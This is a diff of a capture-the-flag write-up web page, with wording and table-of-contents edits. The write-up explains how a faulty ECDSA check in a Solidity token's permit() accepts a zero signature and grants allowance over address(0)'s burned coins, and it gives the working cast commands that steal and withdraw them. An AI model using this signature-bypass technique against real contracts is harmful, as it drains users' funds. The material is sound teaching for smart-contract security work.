@@ -7,7 +7,7 @@
 Team : Phreaks2600
 Source files You can buy coins.
 Of course, you can exchange it back to cash at the original purchase price if there is any left after playing :)
-TL;DR Start an instance Register my address Exploit bad ecdsa signature verification to set myself some fund to transferc coins from another address to myself transfer coin from address(0) to my address withdraw the ether an get the coin Introduction We got three contracts ArcadeMachine.">  
+TL;DR Start an instance Register my address Exploit bad ecdsa signature verification to allow myself some funds to transfer coins from another address to myself transfer coin from address(0) to my address withdraw the ether an get the coin Introduction We got three contracts ArcadeMachine.">  
 
   <title>
     
@@ -42,9 +42,16 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
         <aside >
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#setup">Setup</a></li>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#vulnerability">Vulnerability</a></li>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#setup">Setup</a></li>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+      </ul>
+    </li>
+    <li><a href="#solving">Solving</a></li>
+    <li><a href="#references">References</a></li>
   </ul>
 </nav>
         </aside>
@@ -67,7 +74,7 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 <ul>
 <li>Start an instance</li>
 <li>Register my address</li>
-<li>Exploit bad ecdsa signature verification to set myself some fund to transferc coins from another address to myself</li>
+<li>Exploit bad ecdsa signature verification to allow myself some funds to transfer coins from another address to myself</li>
 <li>transfer coin from address(0) to my address</li>
 <li>withdraw the ether an get the coin</li>
 </ul>
@@ -112,15 +119,15 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 </span></span><span style="display:flex;"><span>alias <span style="color:#79c0ff">check_wallet</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;cast balance $ADDRESS -r $RPC&#39;</span>
 </span></span></code></pre></div><p><code>check_wallet</code> is to rapidly check if the instance is still up because we only got 30 minutes per instance.</p>
 <h2 id="recon">Recon</h2>
-<p>Now i can register : <code>cast send -r $RPC --private-key $PKEY $SETUP &quot;register()&quot; </code> which grant e=me 1337 coins.</p>
-<p>Using <code>withdraw()</code> from Coin i can convert this coin to ether.</p>
+<p>I can register by interacting with setup contract : <code>cast send -r $RPC --private-key $PKEY $SETUP &quot;register()&quot; </code> which grant me 1337 coins.</p>
+<p>Using <code>withdraw()</code> from Coin contract i can convert this coin to ether.</p>
 <p>Also the challenge name <code>Play to earn</code> stand for the ability to play the arcade machine using the function <code>play(uint256)</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">play</span>(<span style="color:#ff7b72">uint256</span> times) <span style="color:#ff7b72">external</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#8b949e;font-style:italic">// burn the coins
 </span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>        require(coin.transferFrom(msg.sender, <span style="color:#ff7b72">address</span>(<span style="color:#a5d6ff">0</span>), <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span> <span style="color:#ff7b72;font-weight:bold">*</span> times));
 </span></span><span style="display:flex;"><span>        <span style="color:#8b949e;font-style:italic">// Have fun XD
 </span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>    }
-</span></span></code></pre></div><p>It transferFrom(src, dst) so it transfer something to sender to address(0) (which is an address with only zero, so it corresponds to nothing : <code>0x0000000000000000000000000000000000000000</code>)</p>
+</span></span></code></pre></div><p>It calls transferFrom(src, dst) so it transfer something from sender to address(0) (which is an address with only zero, so it corresponds to no one, its just here like a void) : <code>0x0000000000000000000000000000000000000000</code>)</p>
 <p>Let&rsquo;s look at <code>transferFrom()</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">transferFrom</span>(<span style="color:#ff7b72">address</span> src, <span style="color:#ff7b72">address</span> dst, <span style="color:#ff7b72">uint</span> wad)
 </span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">public</span>
@@ -140,7 +147,7 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">true</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>If the dst != src and the allowance of the sender on src allowance list is different to uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639936 (these conditions are always True in this challenge if you transfer coin to another account)</p>
+</span></span></code></pre></div><p>If <code>dst != src</code> and <code>allowance[src][sender]</code> (interpreted as the allowance of the sender on src allowance list) != 115792089237316195423570985008687907853269984665640564039457584007913129639936 (these conditions are always True in this challenge if you transfer coin to another account)</p>
 <p>Then it require msg.sender to have enough allowance on src account.</p>
 <p>So it transfer coin from src account to dst account (if src != msg.sender, substract the value to transfer from msg.sender allowance on src) and then substract the transferred amount from src coin balance and increase dst balance.</p>
 <p>Then, <code>play(uint256 times)</code> function transfer 1 ether == 10**18 * times to msg.sender coin balance to address(0) coin balance.</p>
@@ -155,7 +162,7 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 </span></span><span style="display:flex;"><span>        coin.approve(<span style="color:#ff7b72">address</span>(arcadeMachine), <span style="color:#a5d6ff">19</span> <span style="color:#79c0ff">ether</span>);
 </span></span><span style="display:flex;"><span>        arcadeMachine.play(<span style="color:#a5d6ff">19</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>So actually, address(0) got a balance of 19 ** 10**18 coins, which will makes 19 ether if they are withdrawn.</p>
+</span></span></code></pre></div><p>So actually, address(0) got a balance of 19 * 10**18 coins, which will makes 19 ether if they are withdrawn.</p>
 <p>To get these we need to find a way to transfer coins from address(0) balance to our balance using <code>transferFrom()</code>, for that we need to have an allowance amount superior equal the value we want to transfer and then withdraw them.</p>
 <p>To make short, we have two interesting functions, <code>privilegeWithdraw</code> and <code>permit</code>.</p>
 <p>The first one transfer address(0) coin to msg.sender but we need to be the owner of the contract so it sucks.</p>
@@ -165,7 +172,7 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 </span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">payable</span>(msg.sender).transfer(wad);
 </span></span><span style="display:flex;"><span>        emit PrivilegedWithdrawal(msg.sender, wad);
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>The second one ask us to set allowance value for a <code>spender</code> address on <code>owner</code> address if we manage to confirm we are the owner by verifiying a signature with ecdsa.</p>
+</span></span></code></pre></div><p>The second one allow us to set allowance value for a <code>spender</code> address on <code>owner</code> address if we manage to confirm that <code>spender</code> is the <code>owner</code> (specified in the function, not the contract owner) by verifiying a signature with ecdsa.</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">permit</span>(
 </span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">address</span> owner,
 </span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">address</span> spender,
@@ -210,10 +217,10 @@ TL;DR Start an instance Register my address Exploit bad ecdsa signature verifica
 <p>So finally we need to :</p>
 <ul>
 <li>register</li>
-<li>call permit() with <code>owner=address(0), spender=our_address, value=19*10**18, deadline=timestamp, v=0, r=0 and s=0</code></li>
+<li>call permit() with these args:<code>owner=address(0), spender=our_address, value=19*10**18, deadline=timestamp, v=0, r=0 and s=0</code></li>
 <li>transfer coins</li>
 <li>withdraw</li>
-<li>get flag.</li>
+<li>get the flag</li>
 </ul>
 <p>calling permit : <code>cast send -r $RPC --private-key $PKEY $COIN &quot;permit(address,address,uint256,uint256,uint8,bytes32,bytes32)&quot; $(cast address-zero) $ADDRESS 18000000000000000000 1732416543 0 $(cast to-bytes32 0) $(cast to-bytes32 0)</code></p>
 <p>I can now check my allowance on address(0) allowance mapping : <code>cast call $COIN -r $RPC &quot;allowance(address, address)(uint)&quot; $(cast address-zero) $ADDRESS</code> -&gt; 1.8e+19</p>
